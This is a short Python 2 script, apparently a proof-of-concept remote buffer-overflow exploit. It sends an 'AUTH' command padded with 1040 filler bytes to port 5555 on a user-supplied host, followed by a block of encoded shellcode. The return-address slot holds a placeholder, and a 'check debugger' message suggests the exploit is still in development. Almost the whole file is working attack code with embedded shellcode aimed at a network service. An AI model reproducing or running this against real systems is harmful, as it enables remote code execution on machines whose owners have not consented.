#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

shellcode = (
"\xd8\x2e\x2a\x2e\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\x1e\x2a\xc8\xdb\x62\xdb\x8e"
"\x24\x9a\x1c\xef\xad\x7f\x2d\x2f\xc9\xf4\x1e\x9f\x99\x58\x93"
"\x54\xcf\x48\x20\x18\xd8\x7f\x81\x97\x3e\x4e\x12\x8b\x03\xd1"
"\x90\xd6\x57\x31\xa8\x18\xaa\x30\xed\x45\x47\x60\xa6\x02\xfa"
"\x94\xc3\x5f\xc7\x1f\x9f\x4e\x4f\xfc\x68\x70\x7e\x53\xe2\x2b"
"\xa0\x52\x27\x40\xe9\x4c\x24\x6d\xa3\xe7\x9e\x19\x32\x21\xef"
"\xe2\x99\x0c\xdf\x10\xe3\x49\xd8\xca\x96\xa3\x1a\x76\xa1\x70"
"\x60\xac\x24\x62\xc2\x27\x9e\x4e\xf2\xe4\x79\x05\xf8\x41\x0d"
"\x41\x1d\x57\xc2\xfa\x19\xdc\xe5\x2c\xa8\xa6\xc1\xe8\xf0\x7d"
"\x6b\xa9\x5c\xd3\x94\xa9\x3e\x8c\x30\xa2\xd3\xd9\x48\xe9\xbb"
"\x2e\x61\x11\x3c\x39\xf2\x62\x0e\xe6\xa8\xec\x22\x6f\x77\xeb"
"\x45\x5a\xcf\x63\xb8\x65\x30\xaa\x7f\x31\x60\xc4\x56\x3a\xeb"
"\x14\x56\xef\xbc\x44\xf8\x40\x7d\x34\xb8\x30\x15\x5e\x37\x6e"
"\x05\x61\x9d\x07\xac\x98\x76\x22\x3a\xa2\x29\x5a\x3e\xa2\x24"
"\xc7\xb7\x44\x2c\xe7\x91\xdf\xd9\x9e\xbb\xab\x78\x5e\x16\xd6"
"\xbb\xd4\x95\x27\x75\x1d\xd3\x3b\xe2\xed\xae\x61\xa5\xf2\x04"
"\x0d\x29\x60\xc3\xcd\x24\x99\x5c\x9a\x61\x6f\x95\x4e\x9c\xd6"
"\x0f\x6c\x5d\x8e\x68\x34\xba\x73\x76\xb5\x4f\xcf\x5c\xa5\x89"
"\xd0\xd8\x91\x45\x87\xb6\x4f\x20\x71\x79\x39\xfa\x2e\xd3\xad"
"\x7b\x1d\xe4\xab\x83\x48\x92\x53\x35\x25\xe3\x6c\xfa\xa1\xe3"
"\x15\xe6\x51\x0b\xcc\xa2\x62\x46\x4c\x82\xea\x0f\x05\x96\x76"
"\xb0\xf0\xd5\x8e\x33\xf0\xa5\x74\x2b\x71\xa3\x31\xeb\x6a\xd9"
"\x2a\x9e\x8c\x4e\x4a\x8b")

req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
